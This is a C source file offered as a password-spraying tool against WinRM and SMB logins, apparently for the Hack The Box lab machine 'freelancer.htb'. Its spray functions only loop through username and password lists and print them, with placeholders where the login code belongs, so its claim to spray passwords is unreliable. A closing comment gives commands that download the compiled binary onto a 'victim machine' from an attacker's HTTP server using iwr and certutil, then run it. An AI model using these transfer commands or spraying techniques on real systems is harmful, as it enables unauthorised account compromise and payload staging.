/*Pre-requisites
Install mingw
sudo apt-get update
sudo apt-get install mingw-w64 */

//Usage: C program to spray known password against all accounts

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

// Function prototypes
void spray_winrm(const char *target, const char *usernames_file, const char *passwords_file);
void spray_smb(const char *target, const char *usernames_file, const char *passwords_file);

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <service> <target> <usernames_file> <passwords_file>\n", argv[0]);
        printf("Example: %s winrm freelancer.htb usernames.list passwords.list\n", argv[0]);
        return 1;
    }

    const char *service = argv[1];
    const char *target = argv[2];
    const char *usernames_file = argv[3];
    const char *passwords_file = argv[4];

    if (strcmp(service, "winrm") == 0) {
        spray_winrm(target, usernames_file, passwords_file);
    } else if (strcmp(service, "smb") == 0) {
        spray_smb(target, usernames_file, passwords_file);
    } else {
        printf("Unsupported service: %s. Supported services are winrm and smb.\n", service);
    }

    return 0;
}

void spray_winrm(const char *target, const char *usernames_file, const char *passwords_file) {
    printf("[*] Starting WinRM password spray against %s...\n", target);
    FILE *ufile = fopen(usernames_file, "r");
    FILE *pfile = fopen(passwords_file, "r");

    if (!ufile || !pfile) {
        printf("Error opening files.\n");
        return;
    }

    char username[256];
    char password[256];
    while (fgets(username, sizeof(username), ufile)) {
        // Remove newline character
        username[strcspn(username, "\n")] = '\0';
        rewind(pfile);

        while (fgets(password, sizeof(password), pfile)) {
            password[strcspn(password, "\n")] = '\0';
            printf("Trying WinRM: %s:%s\n", username, password);
            // Add WinRM-specific authentication code here
        }
    }

    fclose(ufile);
    fclose(pfile);
}

void spray_smb(const char *target, const char *usernames_file, const char *passwords_file) {
    printf("[*] Starting SMB password spray against %s...\n", target);
    FILE *ufile = fopen(usernames_file, "r");
    FILE *pfile = fopen(passwords_file, "r");

    if (!ufile || !pfile) {
        printf("Error opening files.\n");
        return;
    }

    char username[256];
    char password[256];
    while (fgets(username, sizeof(username), ufile)) {
        // Remove newline character
        username[strcspn(username, "\n")] = '\0';
        rewind(pfile);

        while (fgets(password, sizeof(password), pfile)) {
            password[strcspn(password, "\n")] = '\0';
            printf("Trying SMB: %s:%s\n", username, password);
            // Add SMB-specific authentication code here
        }
    }

    fclose(ufile);
    fclose(pfile);
}

//compile
//x86_64-w64-mingw32-gcc -o spray.exe spray.c -lws2_32

/*
fetch spray.exe onto victim machine using python3 http.server using either of the two methods.
(a) iwr http://10.10.14.43:8000/spray.exe -OutFile spray.exe
(b) certutil -urlcache -split -f http://10.10.14.43:8000/spray.exe spray.exe

//execute
./spray.exe winrm freelancer.htb usernames.list passwords.list
./spray.exe smb freelancer.htb usernames.list passwords.list
*/
